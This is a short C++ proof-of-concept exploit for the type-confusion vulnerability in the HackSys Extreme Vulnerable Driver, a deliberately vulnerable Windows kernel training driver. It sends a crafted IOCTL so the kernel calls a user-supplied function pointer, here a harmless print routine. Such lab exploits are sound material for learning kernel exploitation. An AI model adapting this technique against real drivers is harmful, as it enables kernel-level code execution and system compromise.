#include <iostream>
#include <Windows.h>
#define IOCTL_CODE 0x222023

typedef struct _USER_TYPE_CONFUSION_OBJECT {
    PVOID ObjectID;
    PVOID ObjectType;
} USER_TYPE_CONFUSION_OBJECT, * PUSER_TYPE_CONFUSION_OBJECT;  // User input size = 16 bytes

typedef struct _KERNEL_TYPE_CONFUSION_OBJECT {
    PVOID ObjectID;
    union {
        PVOID ObjectType;
        PVOID Callback;
    }___u1;
} KERNEL_TYPE_CONFUSION_OBJECT, * PKERNEL_TYPE_CONFUSION_OBJECT;  // Also 16 bytes


void ExampleCallback() {
    printf("[+] User callback for type confusion\n");
}


int main() {
    USER_TYPE_CONFUSION_OBJECT DriverParams = { 0 };
    DriverParams.ObjectID = (PVOID)0x1122334455667788;  // No need for this
    DriverParams.ObjectType = &ExampleCallback;
    DWORD BytesReturned = 0;
    HANDLE DriverHandle = CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver", GENERIC_ALL, FILE_SHARE_DELETE | FILE_SHARE_WRITE | FILE_SHARE_READ,
        NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (DriverHandle == INVALID_HANDLE_VALUE) {
        printf("[-] DriverHandle = INVALID_HANDLE_VALUE\n");
        return FALSE;
    }
    if (!DeviceIoControl(DriverHandle, IOCTL_CODE, &DriverParams, sizeof(DriverParams), NULL, NULL, &BytesReturned, NULL)) {
        printf("[-] Driver operation failed\n");
        CloseHandle(DriverHandle);
        return FALSE;
    }
    printf("[+] Driver operation succeeded\n");
    CloseHandle(DriverHandle);
    return TRUE;
}
